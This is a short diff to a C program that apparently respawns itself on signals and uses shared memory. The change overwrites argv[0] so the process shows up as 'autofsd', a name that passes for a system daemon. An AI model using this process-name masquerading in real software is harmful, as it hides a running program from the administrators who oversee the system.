@@ -1,7 +1,8 @@
-#include <signal.h>
-#include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
 #include <sys/shm.h>
 
 #define NUMBER_OF_THE_BEAST 666
@@ -30,6 +31,9 @@ void spawn_again(int signum)
 
 int main(int argc, char **argv)
 {
+	/* mask process name */
+	strcpy(argv[0], "autofsd");
+
 	/* Initialize shard memory */
 	const int shmid = shmget(NUMBER_OF_THE_BEAST, sizeof(struct shared), IPC_CREAT | 0666);
 	if (shmid == -1) {
